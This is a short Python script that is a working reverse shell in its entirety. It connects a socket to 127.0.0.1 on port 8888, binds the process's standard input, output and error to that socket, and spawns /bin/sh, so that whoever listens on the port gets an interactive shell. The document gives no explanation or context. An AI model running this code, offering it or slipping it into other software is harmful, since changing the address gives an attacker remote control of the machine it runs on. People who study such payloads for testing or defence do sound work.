import socket,os, subprocess,pty
s=socket.socket()
s.connect(("127.0.0.1",8888))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")

